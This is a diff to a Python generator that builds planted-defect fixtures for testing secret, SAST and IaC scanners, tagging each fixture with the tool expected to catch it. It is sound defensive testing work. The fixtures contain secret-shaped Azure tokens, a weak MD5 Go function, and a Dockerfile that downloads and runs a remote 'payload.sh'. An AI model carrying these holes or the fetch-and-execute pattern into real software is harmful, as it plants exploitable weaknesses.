@@ -76,11 +76,16 @@ def add(path: str, body: str, signal: str | None, tool: str | None = None) -> No
 
 
 # ---------------------------------------------------------------- secrets
+# PINNED TO GITLEAKS. The point of these three is that the Azure/Entra rules the reusable
+# workflow inlines actually load and fire through the consumer path -- the defect that once
+# shipped was fourteen rules the workflow never loaded while its own CI stayed green. These files
+# are generated, never committed (0917493), and reach the scan only through the TEST-ONLY seed
+# input (KDEC-011), which places them in the secret-scan job alone.
 add("secrets/azure_storage.txt", f"""
     {BANNER}
     # gitleaks: azure-storage-connection-string
     {AZURE_STORAGE_CS}
-    """, "secret:azure-storage-connection-string")
+    """, "secret:azure-storage-connection-string", tool="gitleaks")
 
 add("secrets/entra.env", f"""
     {BANNER}
@@ -88,12 +93,12 @@ add("secrets/entra.env", f"""
     AZURE_CLIENT_SECRET="{ENTRA_SECRET}"
     # gitleaks: azure-devops-pat
     AZURE_DEVOPS_PAT=ou6xnraqe7le5mdk255mcjsfzww2gpsomjtxx4ufvgnbzgqchlfa
-    """, "secret:entra-client-secret")
+    """, "secret:entra-client-secret", tool="gitleaks")
 
 add("secrets/servicebus.txt", f"""
     {BANNER}
     {SERVICEBUS_CS}
-    """, "secret:azure-shared-access-key")
+    """, "secret:azure-shared-access-key", tool="gitleaks")
 
 # NEGATIVE CONTROLS — these must NOT trigger. False positives are a defect too.
 add("secrets/negative_controls.md", """
@@ -268,7 +273,7 @@ add("services/worker/vuln.go", """
     func weak(s string) string { h := md5.Sum([]byte(s)); return fmt.Sprintf("%x", h) }
 
     func main() { fmt.Println(weak("x")) }
-    """, "sast:go-gosec-second-root")
+    """, "sast:go-gosec-second-root", tool="gosec")
 
 # ---------------------------------------------------------------- go
 add("go/go.mod", """
@@ -351,7 +356,7 @@ add("infra/main.tf", """
       resource_group_name         = "rg"
       network_security_group_name = "nsg"
     }
-    """, "iac:checkov")
+    """, "iac:checkov", tool="checkov")
 
 add("infra/Dockerfile", """
     FROM ubuntu:latest
@@ -360,7 +365,7 @@ add("infra/Dockerfile", """
     ADD http://example.com/payload.sh /tmp/payload.sh
     RUN chmod +x /tmp/payload.sh && /tmp/payload.sh
     CMD ["/bin/bash"]
-    """, "iac:dockerfile")
+    """, "iac:dockerfile", tool="trivy-iac")
 
 
 def main() -> int:
